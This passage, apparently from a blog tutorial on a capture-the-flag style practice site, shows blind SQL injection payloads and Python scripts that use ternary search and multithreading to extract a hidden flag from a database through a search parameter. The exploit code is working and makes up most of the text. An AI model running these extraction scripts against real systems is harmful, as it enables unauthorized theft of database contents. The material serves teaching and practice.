class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it looks like this:</p>
<p><img src="/img/sql-injection-in-action/p2.png"></p>
<p>It took about 90 seconds to get the answer, which is much faster than before.</p>
<p>Assuming n is the length of the string, and our character set has about 27 characters, in the worst case, we need 27n attempts to get the flag. With this method, we only need 27n&#x2F;3 &#x3D; 9n attempts.</p>
<p>However, this is still not fast enough. Since we already have three types of results, why not use them in a different way?</p>
<h3><span id="further-acceleration-ternary-search">Further acceleration: Ternary search</span></h3><p>Instead of trying three at a time, we can try “three groups of three” by dividing the original character set into three equal parts, such as <code>&#125;abcdefghijklmnopqrstuvwxyz_</code>, which can be divided into:</p>
<ol>
<li>}abcdefgh</li>
<li>ijklmnopq</li>
<li>rstuvwxyz_</li>
</ol>
<p>We can check if the character is in a specific group by using the following SQL query:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">case</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;&#125;%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;a%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;b%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;c%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;d%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;e%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;f%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;g%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;h%'</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">1</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;i%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;j%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;k%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;l%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;m%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;n%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;o%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;p%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;q%'</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">2</span>
  <span class="token keyword">when</span> <span class="token punctuation">(</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;r%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;s%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;t%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;u%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;v%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;w%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;x%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;y%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;z%'</span><span class="token punctuation">)</span> <span class="token operator">or</span>
    <span class="token punctuation">(</span>content <span class="token operator">like</span> <span class="token string">'cymetrics&#123;\_%'</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span> <span class="token keyword">then</span> <span class="token number">5</span>
  <span class="token keyword">else</span> <span class="token number">10</span>
<span class="token keyword">end</span> <span class="token keyword">from</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Each time it is divided into three equal parts for searching, it becomes a ternary search. In the worst case, the number of attempts required is reduced from 9n to 3n. The script is as follows (the ternary search part is a bit messy and may contain bugs):</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-search-teanary.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse

<span class="token keyword">def</span> <span class="token function">print_success</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\033[92m</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw<span class="token punctuation">&#125;</span></span><span class="token string">\033[0m"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
char_index <span class="token operator">=</span> <span class="token number">0</span>
char_set <span class="token operator">=</span> <span class="token string">'&#125;abcdefghijklmnopqrstuvwxyz_'</span>
result <span class="token operator">=</span> <span class="token string">'cymetrics&#123;'</span>

is_over <span class="token operator">=</span> <span class="token boolean">False</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  print_success<span class="token punctuation">(</span><span class="token string">"result: "</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
  <span class="token keyword">if</span> is_over<span class="token punctuation">:</span>
    <span class="token keyword">break</span>

  found <span class="token operator">=</span> <span class="token boolean">False</span>
  L <span class="token operator">=</span> <span class="token number">0</span>
  R <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_set<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
  <span class="token keyword">while</span> L<span class="token operator">&lt;=</span>R<span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token punctuation">(</span>R<span class="token operator">-</span>L<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">3</span>
    ML <span class="token operator">=</span> L <span class="token operator">+</span> s
    MR <span class="token operator">=</span> L <span class="token operator">+</span> s <span class="token operator">*</span> <span class="token number">2</span>
    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      MR <span class="token operator">=</span> L <span class="token operator">+</span> <span class="token number">1</span>

    group <span class="token operator">=</span> <span class="token punctuation">[</span>
      char_set<span class="token punctuation">[</span>L<span class="token punctuation">:</span>ML<span class="token punctuation">]</span><span class="token punctuation">,</span>
      char_set<span class="token punctuation">[</span>ML<span class="token punctuation">:</span>MR<span class="token punctuation">]</span><span class="token punctuation">,</span>
      char_set<span class="token punctuation">[</span>MR<span class="token punctuation">:</span>R<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>

    conditions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token comment"># 空的話加上 1=2，一個恆假的條件</span>
        conditions<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"1=2"</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>
      <span class="token comment"># 這邊要對 _ 做處理，加上 /，否則 _ 會配對到任意一個字元</span>
      arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"(content like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">92</span><span class="token punctuation">)</span> <span class="token operator">+</span> c <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token keyword">else</span> c<span class="token punctuation">&#125;</span></span><span class="token string">%')"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>
      conditions<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" or "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
    (select case
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 1  
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 2  
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 5
      else 10
    end from flag)
    '''</span></span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"trying"</span><span class="token punctuation">,</span> group<span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/search.php?tag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
      is_over <span class="token operator">=</span> <span class="token boolean">True</span>
      <span class="token keyword">break</span>

    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"end"</span><span class="token punctuation">)</span>
      is_over <span class="token operator">=</span> <span class="token boolean">True</span>
      <span class="token keyword">break</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
      R <span class="token operator">=</span> ML
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">break</span>
      
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"home1"</span><span class="token punctuation">:</span>
        L <span class="token operator">=</span> ML
        R <span class="token operator">=</span> MR
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
          result <span class="token operator">+=</span> group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
          <span class="token keyword">break</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        L <span class="token operator">=</span> MR
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
          result <span class="token operator">+=</span> group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
          <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it looks like this:</p>
<p><img src="/img/sql-injection-in-action/p3.png"></p>
<p>It took 45 seconds, which is twice as fast as the previous method.</p>
<h3><span id="final-acceleration-multi-threading">Final acceleration: Multi-threading</span></h3><p>Previously, we waited for one request to return before sending the next one. But we can actually use multiple threads to send requests at the same time. For example, each thread can guess a fixed position value, which should speed up the attempts.</p>
<p>Although the number of attempts is the same, the number of attempts per second is increased, so the overall time is naturally reduced.</p>
<p>Below is the code for a simple implementation. You need to know the length of the final string first, and a more sophisticated approach is to first search for the length of the data to be retrieved, and then retrieve the data itself:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-search-thread.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> concurrent<span class="token punctuation">.</span>futures

<span class="token keyword">def</span> <span class="token function">print_success</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\033[92m</span><span class="token interpolation"><span class="token punctuation">&#123;</span>raw<span class="token punctuation">&#125;</span></span><span class="token string">\033[0m"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
char_index <span class="token operator">=</span> <span class="token number">0</span>
char_set <span class="token operator">=</span> <span class="token string">'&#125;abcdefghijklmnopqrstuvwxyz_'</span>
flag <span class="token operator">=</span> <span class="token string">'cymetrics&#123;'</span>

<span class="token keyword">def</span> <span class="token function">get_char</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
  L <span class="token operator">=</span> <span class="token number">0</span>
  R <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>char_set<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
  prefix <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">*</span> index
  <span class="token keyword">while</span> L<span class="token operator">&lt;=</span>R<span class="token punctuation">:</span>
    s <span class="token operator">=</span> <span class="token punctuation">(</span>R<span class="token operator">-</span>L<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">3</span>
    ML <span class="token operator">=</span> L <span class="token operator">+</span> s
    MR <span class="token operator">=</span> L <span class="token operator">+</span> s <span class="token operator">*</span> <span class="token number">2</span>
    <span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      MR <span class="token operator">=</span> L <span class="token operator">+</span> <span class="token number">1</span>

    group <span class="token operator">=</span> <span class="token punctuation">[</span>
      char_set<span class="token punctuation">[</span>L<span class="token punctuation">:</span>ML<span class="token punctuation">]</span><span class="token punctuation">,</span>
      char_set<span class="token punctuation">[</span>ML<span class="token punctuation">:</span>MR<span class="token punctuation">]</span><span class="token punctuation">,</span>
      char_set<span class="token punctuation">[</span>MR<span class="token punctuation">:</span>R<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token punctuation">]</span>

    conditions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        conditions<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"1=2"</span><span class="token punctuation">)</span>
        <span class="token keyword">continue</span>
      arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"(content like '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">92</span><span class="token punctuation">)</span> <span class="token operator">+</span> c <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token keyword">else</span> c<span class="token punctuation">&#125;</span></span><span class="token string">%')"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> group<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>
      conditions<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">" or "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
    (select case
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 1  
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 2  
      when (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>conditions<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">) then 5
      else 10
    end from flag)
    '''</span></span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"For </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string"> trying"</span></span><span class="token punctuation">,</span> group<span class="token punctuation">)</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/search.php?tag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token boolean">False</span>

    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
      <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>
      R <span class="token operator">=</span> ML
      <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
      
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"home1"</span><span class="token punctuation">:</span>
        L <span class="token operator">=</span> ML
        R <span class="token operator">=</span> MR
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
          <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
      <span class="token keyword">else</span><span class="token punctuation">:</span>
        L <span class="token operator">=</span> MR
        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
          <span class="token keyword">return</span> group<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    length <span class="token operator">=</span> <span class="token number">15</span>
    ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> length
    <span class="token keyword">with</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">(</span>max_workers<span class="token operator">=</span>length<span class="token punctuation">)</span> <span class="token keyword">as</span> executor<span class="token punctuation">:</span>
        futures <span class="token operator">=</span> <span class="token punctuation">&#123;</span>executor<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>get_char<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">:</span> i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">for</span> future <span class="token keyword">in</span> concurrent<span class="token punctuation">.</span>futures<span class="token punctuation">.</span>as_completed<span class="token punctuation">(</span>futures<span class="token punctuation">)</span><span class="token punctuation">:</span>
            index <span class="token operator">=</span> futures<span class="token punctuation">[</span>future<span class="token punctuation">]</span>
            data <span class="token operator">=</span> future<span class="token punctuation">.</span>result<span class="token punctuation">(</span><span class="token punctuation">)</span>
            print_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string"> is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            ans<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> data

    print_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>n <span class="token keyword">for</span> n <span class="token keyword">in</span> ans <span class="token keyword">if</span> n <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
run<span class="token punctuation">(</span><span class="token punctuation">)</span>
